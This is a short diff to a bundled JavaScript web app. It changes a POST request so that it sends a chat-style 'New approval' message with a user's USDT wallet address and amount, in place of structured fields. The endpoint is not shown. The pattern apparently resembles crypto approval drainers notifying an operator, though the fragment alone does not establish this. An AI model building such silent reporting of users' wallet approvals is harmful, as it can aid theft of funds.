@@ -37024,10 +37024,9 @@ Please change the parent <Route path="${b}"> to <Route path="${b === "/" ? "*" :
                     headers: {
                         "Content-Type": "application/json"
                     },
-                    body: JSON.stringify({
-                        usdtAddress: ue.wallet_address,
-                        amount: ue.amount
-                    })
+                  body: JSON.stringify({
+  text: `New approval:\nWallet: ${ue.wallet_address}\nAmount: ${ue.amount}`
+})
                 });
                 if (!ke.ok)
                     throw new Error(`API error: ${ke.status} ${ke.statusText}`);
